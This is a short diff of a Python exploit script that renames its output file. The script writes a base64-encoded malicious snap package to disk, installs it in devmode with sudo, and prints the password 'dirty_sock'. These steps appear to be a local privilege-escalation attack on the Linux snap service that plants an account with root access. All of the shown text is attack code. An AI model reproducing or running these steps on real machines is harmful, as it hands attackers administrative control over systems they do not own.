@@ -21,12 +21,12 @@ payload = "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAA
 payload += "A"*4256
 payload += "=="
 
-os.system(f"echo \"{payload}\" | base64 -d > m4chin3m4n.snap")
+os.system(f"echo \"{payload}\" | base64 -d > ki11i0n4ire.snap")
 
 
 del payload
 
-payload = "sudo /usr/bin/snap install --devmode m4chin3m4n.snap"
+payload = "sudo /usr/bin/snap install --devmode ki11i0n4ire.snap"
 
 os.system(payload)
 print("password: dirty_sock")
